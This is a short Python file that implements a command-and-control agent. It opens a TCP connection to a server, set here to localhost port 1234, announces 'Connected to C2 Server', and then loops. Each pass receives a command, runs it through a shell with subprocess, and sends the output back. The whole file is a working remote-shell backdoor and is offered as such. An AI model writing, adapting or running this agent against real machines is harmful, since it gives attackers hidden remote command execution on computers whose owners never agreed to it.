import subprocess
import time
import socket




IP_SERVER = '127.0.0.1'
PORT_SERVER = 1234


def dns():
    # we use dns to get our server ip
    # we use a fixed IP and port for simplicity
    return IP_SERVER, PORT_SERVER

def agant():
       
    try:    
        ip_address, port_number = dns()
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((ip_address, port_number))
        print("[+] Connected to C2 Server")
        while True:
            # Wait for command from server
            command = connection.recv(4096).decode()
            if command.lower() == 'quit':
                break
            if not command:
                print("[-] No command received, retrying...")
                time.sleep(1)
                continue
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
            except Exception as e:
                output = f"Error executing command: {e}"
            # Send back the output
            connection.send(output.encode())
            print(f"[+] Sent output: {output}")
            print(f"[+] Sent output: {output}")
            time.sleep(1)  # Simulate some processing delay
    except (ConnectionRefusedError, socket.error) as e:
        print(f"[-] Connection error: {e}")
        time.sleep(5)

    except Exception as e:
        print(f"[-] Error in agent thread: {e}")
        connection.close()
        return 

if __name__ == "__main__":
    agant()
        